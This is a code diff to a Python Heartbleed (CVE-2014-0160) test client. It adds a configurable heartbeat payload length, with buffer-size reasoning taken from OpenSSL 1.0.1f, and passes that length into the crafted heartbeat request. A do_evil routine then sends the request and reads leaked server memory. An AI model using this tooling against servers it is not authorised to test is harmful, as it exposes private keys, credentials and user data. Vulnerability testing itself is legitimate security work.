@@ -11,7 +11,43 @@ import socket
 import sys
 import struct
 import select, time
-from argparse import ArgumentParser
+from argparse import ArgumentParser, ArgumentTypeError
+
+# OpenSSL 1.0.1f buffer size is 4096 (DEFAULT_BUFFER_SIZE), data is flushed in
+# buffer_write iff the size of the TLSPlaintext ("fragment") exceeds that
+# buffer. So, to reliably get a heartbeat back, the payload length must be at
+# least 4097 ("over 4096") - 5 (content type, TLS version, record length) - 3
+# (HB type, payload length) - 16 (added padding). Also note that the maximum
+# TLSPlaintext length is 0x4000 (SSL3_RT_MAX_PLAIN_LENGTH, enforced via
+# max_send_fragment in ssl3_write_bytes).
+#
+# The returned heartbeat fragment has length 3 + payload length + 16 (type,
+# payload length, payload, padding).
+MAX_PLAIN_LENGTH = 0x4000
+
+def payload_len(string):
+    # Minimum OpenSSL buffer fill size for the fragment (excl. record "header")
+    pl_min = 4097 - 5
+    # Drop type (1) + payload length (2) + padding (16) = 19
+    pl_max = 0xffed
+    payload_len = int(string, 0) # Accept decimal (e.g. 18) and hex (e.g. 0x12)
+    if payload_len > pl_max:
+        raise ArgumentTypeError('Payload length must be at most {0} ({0:#x})'
+            .format(pl_max))
+    if payload_len < pl_min:
+        raise ArgumentTypeError('Payload length must be at least {0} ({0:#x})'
+            .format(pl_min))
+
+    # Size of total response incl. hb type, payload len and padding
+    response_len = 3 + payload_len + 16
+    # Each response block must be at be the buffer size
+    if 0 < response_len % MAX_PLAIN_LENGTH < pl_min:
+        safe_payload_len = MAX_PLAIN_LENGTH * (response_len // MAX_PLAIN_LENGTH)
+        safe_payload_len += pl_min - 3 - 16
+        print(('Warning: payload length {0} ({0:#x}) will cause delays, ' +
+            'try at least {1} ({1:#x})').format(payload_len, safe_payload_len))
+
+    return payload_len
 
 parser = ArgumentParser(description='Test clients for Heartbleed (CVE-2014-0160)')
 parser.add_argument('-6', '--ipv6', action='store_true',
@@ -29,7 +65,11 @@ parser.add_argument('-t', '--timeout', type=int, default=3,
 parser.add_argument('--skip-server', default=False, action='store_true',
         help='Skip ServerHello, immediately write Heartbeat request')
 parser.add_argument('-x', '--count', type=int, default=1,
-        help='Number of Hearbeats requests to be sent (default %(default)d)')
+        help='Number of Heartbeats requests to be sent (default %(default)d)')
+parser.add_argument('-n', '--payload-length', type=payload_len, default=0xffed,
+        dest='payload_len',
+        help='Requested payload length including 19 bytes heartbeat type, ' +
+            'payload length and padding (default %(default)#x bytes)')
 
 def make_hello(sslver, cipher):
     # Record
@@ -53,7 +93,7 @@ def make_hello(sslver, cipher):
     data += ' 01'    # mode
     return bytearray.fromhex(data.replace('\n', ''))
 
-def make_heartbeat(sslver):
+def make_heartbeat(sslver, payload_len=0xffed):
     data = '18 ' + sslver
     data += ' 00 03'    # Length
     data += ' 01'       # Type: Request
@@ -62,7 +102,7 @@ def make_heartbeat(sslver):
     # too small, OpenSSL buffers it and this will cause issues with repeated
     # heartbeat requests. Therefore request a payload that fits exactly in four
     # records (0x4000 * 4 - 3 - 16 = 0xffed).
-    data += ' ff ed'    # Payload Length
+    data += ' {0:02x} {1:02x}'.format(payload_len >> 8, payload_len & 0xFF)
     return bytearray.fromhex(data.replace('\n', ''))
 
 def hexdump(data):
@@ -275,7 +315,7 @@ class RequestHandler(socketserver.BaseRequestHandler):
     def do_evil(self):
         '''Returns True if memory *may* be acquired'''
         # (2) HeartbeatRequest
-        self.request.sendall(make_heartbeat(self.sslver))
+        self.request.sendall(make_heartbeat(self.sslver, self.args.payload_len))
 
         # (3) Buggy OpenSSL will throw 0xffff bytes, fixed ones stay silent
         memory = read_hb_response(self.request, self.args.timeout)
